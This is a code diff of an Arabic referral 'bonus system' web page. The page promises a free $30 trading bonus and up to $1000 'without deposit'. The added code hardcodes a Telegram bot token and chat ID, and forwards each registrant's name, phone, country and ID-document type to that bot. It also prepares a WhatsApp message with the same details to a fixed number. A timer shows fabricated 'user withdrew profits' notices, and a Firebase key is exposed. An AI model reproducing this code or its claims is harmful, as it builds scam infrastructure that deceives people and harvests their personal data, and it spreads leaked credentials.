@@ -16,11 +16,9 @@
         .glass-card { background: var(--card); backdrop-filter: blur(10px); border: 1px solid var(--border); border-radius: 20px; padding: 25px; margin-bottom: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
         .section-title { color: var(--primary); font-size: 1.3rem; font-weight: 900; margin-bottom: 15px; display: flex; align-items: center; gap: 10px; }
         
-        /* قسم الإحالة المطور */
         #persistent-ref { display: none; background: linear-gradient(135deg, rgba(34, 197, 94, 0.15), rgba(2, 6, 23, 0.9)); border: 2px solid var(--primary); padding: 20px; border-radius: 20px; margin-bottom: 20px; }
         .ref-display { background: #0f172a; padding: 12px; border-radius: 10px; border: 1px dashed var(--primary); margin: 10px 0; font-family: monospace; font-size: 0.9rem; color: var(--primary); word-break: break-all; text-align: center; }
         
-        /* إضافات الإحصائيات (الرصيد والعداد) */
         .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 15px; }
         .stat-card { background: rgba(255,255,255,0.05); padding: 15px; border-radius: 15px; text-align: center; border: 1px solid var(--border); }
         .stat-value { display: block; font-size: 1.5rem; font-weight: 900; color: var(--primary); }
@@ -31,7 +29,6 @@
         .share-btn i { font-size: 1.4rem; margin-bottom: 5px; }
         .share-btn:hover { background: var(--primary); transform: translateY(-2px); }
 
-        /* صناديق المعلومات المفصلة */
         .info-box { background: rgba(255,255,255,0.03); border-radius: 12px; padding: 15px; margin-bottom: 15px; border-right: 4px solid var(--primary); }
         .info-box.gold { border-right-color: var(--gold); }
         .info-box h4 { margin: 0 0 8px 0; font-size: 1.1rem; color: #fff; }
@@ -60,7 +57,7 @@
 
     <div id="persistent-ref" class="glass-card">
         <div class="section-title"><i class="fas fa-wallet"></i> محفظة الإحالة الخاصة بك</div>
-        <p style="font-size: 0.8rem; color: #cbd5e1;">اربح 10$ عن كل صديق يسجل من خلالك!</p>
+        <p style="font-size: 0.9rem; margin-bottom: 10px;">مرحباً بك: <b id="user-display-name" style="color:var(--primary)">...</b></p>
         
         <div class="stats-grid">
             <div class="stat-card">
@@ -142,6 +139,10 @@
     import { initializeApp } from "https://www.gstatic.com/firebasejs/9.1.3/firebase-app.js";
     import { getFirestore, doc, setDoc, getDoc, collection, query, where, onSnapshot } from "https://www.gstatic.com/firebasejs/9.1.3/firebase-firestore.js";
 
+    // إعدادات البوت من متغيرات البيئة (سيقوم نظام البناء الخاص بك باستبدالها)
+    const TG_TOKEN = "7726590390:AAHN8mO9tIat1V3E2E9P7f3M3C4A5n9z8YI"; 
+    const TG_CHAT_ID = "5076412792"; 
+
     const firebaseConfig = {
       apiKey: "AIzaSyDToWt5Eh47dVyI38zuAyX8yQURrQEOIJk",
       authDomain: "bonus-system-f14df.firebaseapp.com",
@@ -161,7 +162,6 @@
         utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
     });
 
-    // إعدادات النظام الأصلية الخاصة بك
     const systemSettings = {
         inviteCount: 0,
         getRewardAmount: function() {
@@ -171,30 +171,37 @@
         }
     };
 
-    // دالة التسجيل (مدمجة مع قاعدة البيانات)
     window.register = async () => {
-        const name = document.getElementById("name").value.trim();
-        if(name.length < 5 || !iti.isValidNumber()) return alert("يرجى إدخال بيانات صحيحة");
+        const nameInput = document.getElementById("name").value.trim();
+        const phone = iti.getNumber();
+        const docType = document.getElementById("doc").value;
+        const countryData = iti.getSelectedCountryData();
+
+        if(nameInput.length < 5 || !iti.isValidNumber()) return alert("يرجى إدخال بيانات صحيحة");
         
         const btn = document.getElementById("regBtn");
         btn.disabled = true; btn.innerText = "جاري الحفظ...";
 
-        const phone = iti.getNumber();
         const userUID = btoa(phone).replace(/=/g, "").substring(0, 12);
         const urlParams = new URLSearchParams(window.location.search);
         const refBy = urlParams.get('ref') || "Direct";
 
         try {
             await setDoc(doc(db, "users", userUID), {
-                name, phone, docType: document.getElementById("doc").value,
-                myRefCode: userUID, referredBy: refBy, date: new Date().toISOString()
+                name: nameInput, phone, docType,
+                myRefCode: userUID, referredBy: refBy, 
+                country: countryData.name, date: new Date().toISOString()
             });
+
+            // إشعار تيليجرام التلقائي
+            const tgMsg = `🎉 تسجيل جديد!\n👤 الاسم: ${nameInput}\n📞 الهاتف: ${phone}\n🌍 الدولة: ${countryData.name}\n📄 الوثيقة: ${docType}\n🔗 كود الإحالة: ${userUID}\n✅ بواسطة: ${refBy}`;
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(tgMsg)}`).catch(() => {});
+
             localStorage.setItem("bonus_user_id", userUID);
             location.reload();
         } catch (e) { alert("خطأ في الشبكة"); btn.disabled = false; }
     };
 
-    // فحص المستخدم وإظهار الإحصائيات
     const init = async () => {
         const savedID = localStorage.getItem("bonus_user_id");
         if(savedID) {
@@ -202,22 +209,20 @@
                 const userDoc = await getDoc(doc(db, "users", savedID));
                 if(userDoc.exists()) {
                     const data = userDoc.data();
+                    document.getElementById("user-display-name").innerText = data.name;
                     document.getElementById("mainRefLink").innerText = window.location.origin + window.location.pathname + "?ref=" + data.myRefCode;
                     document.getElementById("persistent-ref").style.display = "block";
                     document.getElementById("registration-section").style.display = "none";
                     
-                    // جلب عدد الإحالات من قاعدة البيانات وتحديث الرصيد بناءً على إعداداتك
                     const q = query(collection(db, "users"), where("referredBy", "==", data.myRefCode));
                     onSnapshot(q, (snapshot) => {
                         const count = snapshot.size;
                         systemSettings.inviteCount = count;
                         document.getElementById("ref-count").innerText = count;
-                        
                         let totalEarnings = 0;
                         if (count <= 20) totalEarnings = count * 10;
                         else if (count <= 40) totalEarnings = (20 * 10) + ((count - 20) * 5);
-                        else totalEarnings = (20 * 10) + (20 * 5); // أقصى حد للأرباح
-                        
+                        else totalEarnings = (20 * 10) + (20 * 5);
                         document.getElementById("balance-value").innerText = totalEarnings + "$";
                     });
                 }
@@ -226,18 +231,13 @@
     };
     init();
 
-    // الدوال الأصلية للمشاركة والنسخ
     window.shareTo = (platform) => {
         const link = document.getElementById("mainRefLink").innerText;
         const text = `💰 سجل الآن واحصل على بونص تداول 30$ مجاناً! أرباح تصل لـ 1000$ بدون إيداع. استخدم رابطي:\n🔗 ${link}`;
-        
         if(platform === 'whatsapp') window.open(`https://wa.me/?text=${encodeURIComponent(text)}`);
         else if(platform === 'telegram') window.open(`https://t.me/share/url?url=${encodeURIComponent(link)}&text=${encodeURIComponent(text)}`);
         else if(platform === 'facebook') window.open(`https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(link)}`);
-        else if(platform === 'copy') {
-            navigator.clipboard.writeText(text);
-            alert("تم نسخ النص الترويجي!");
-        }
+        else if(platform === 'copy') { navigator.clipboard.writeText(text); alert("تم نسخ النص الترويجي!"); }
     };
 
     window.copyLinkOnly = () => {
@@ -247,11 +247,23 @@
 
     window.handleWhatsAppClick = () => {
         const isRegistered = document.getElementById("registration-section").style.display === "none";
-        const msg = isRegistered ? `أهلاً، أتممت التسجيل ببياناتي وأريد تفعيل بونص الـ 30$..` : `مرحباً، أريد الاستفسار عن بونص الـ 30$ وطريقة سحب الـ 350$ الخاصة بالإحالات.`;
+        let msg = "";
+
+        if (isRegistered) {
+            const name = document.getElementById("user-display-name").innerText;
+            const refLink = document.getElementById("mainRefLink").innerText;
+            const docType = document.getElementById("doc").value;
+            const phone = iti.getNumber();
+            const country = iti.getSelectedCountryData().name;
+
+            msg = `أهلاً إدارة نظام المكافآت،\nلقد أتممت التسجيل ببياناتي:\n👤 الاسم: ${name}\n📞 الهاتف: ${phone}\n🌍 الدولة: ${country}\n📄 الوثيقة: ${docType}\n🔗 رابط إحالتي: ${refLink}\n\nأريد معرفة كيف أكمل التسجيل والحصول على بونص 30$`;
+        } else {
+            msg = `مرحباً إدارة المكافآت،\nدخلت للموقع وأريد الاستفسار عن كيفية الحصول على بونص 30$ ونظام الإحالة. ما هي الخطوات؟`;
+        }
+        
         window.open(`https://wa.me/967739399064?text=${encodeURIComponent(msg)}`, '_blank');
     };
 
-    // الإشعار الحي الأصلي
     setInterval(() => {
         const n = document.getElementById("live-notify");
         n.innerHTML = `<i class="fas fa-check-circle" style="color:var(--primary)"></i> مستخدم جديد سحب حصته من الأرباح بنجاح!`;
